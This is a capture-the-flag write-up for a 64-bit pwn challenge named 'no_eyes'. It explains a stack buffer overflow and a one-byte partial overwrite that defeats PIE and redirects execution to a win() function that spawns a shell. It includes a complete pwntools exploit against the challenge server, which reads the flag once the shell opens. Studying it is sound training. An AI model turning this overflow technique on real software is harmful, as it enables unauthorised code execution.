# no_eyes Writeup

## Challenge

The challenge provides a 64-bit Linux PIE binary with a matching `libc.so.6` and
loader.

Remote:

```bash
nc 34.62.69.250 41070
```

## Protections

```text
Full RELRO
No Canary
NX enabled
PIE enabled
Not stripped
```

The useful part is that there is no stack canary, so the stack return address can
be overwritten. PIE is enabled, but the exploit only needs a partial overwrite.

## Vulnerability

The vulnerable function allocates `0x20` bytes on the stack, then reads `0x100`
bytes into that buffer:

```asm
vulnerable:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20
    ...
    lea rax, [rbp-0x20]
    mov edx, 0x100
    mov rsi, rax
    mov edi, 0
    call read
    leave
    ret
```

So the offset to the saved return address is:

```text
0x20 bytes buffer + 0x8 bytes saved RBP = 40 bytes
```

There is also a `win()` function:

```c
int64_t win()
{
    puts("You found it!");
    return execve("/bin/sh", 0, 0);
}
```

## PIE Bypass

After `main()` calls `vulnerable()`, execution normally returns to:

```text
PIE base + 0x12e9
```

The target function `win()` is at:

```text
PIE base + 0x122a
```

These addresses are in the same memory page and only differ in the lowest byte:

```text
0x12e9 -> 0x122a
```

Because ASLR randomizes the PIE base at page granularity, the lower 12 bits of
these offsets stay fixed. That means we do not need a leak. We can overwrite only
the least significant byte of the saved return address from `0xe9` to `0x2a`.

The payload is:

```python
b"A" * 40 + b"\x2a"
```

It must be sent as raw bytes. Do not use `sendline()` for the payload, because
the newline would overwrite the next byte of the saved return address.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *


HOST = "34.62.69.250"
PORT = 41070

context.binary = elf = ELF("./chall", checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path])


def main():
    io = start()

    payload = b"A" * 40 + p8(elf.sym.win & 0xff)

    io.recvuntil(b"Input: ")
    io.send(payload)

    if args.REMOTE:
        io.recvuntil(b"You found it!\n")
        io.sendline(b"cat flag* 2>/dev/null; cat /flag 2>/dev/null")
        print(io.recvrepeat(2).decode(errors="replace"))
    else:
        io.interactive()


if __name__ == "__main__":
    main()
```

Run it:

```bash
python3 solve.py REMOTE
```

## Summary

The binary has a simple stack overflow and a reachable `win()` function. Even
though PIE is enabled, the saved return address already points near `win()`, so a
single-byte partial overwrite is enough to redirect execution to `win()` and get
a shell.
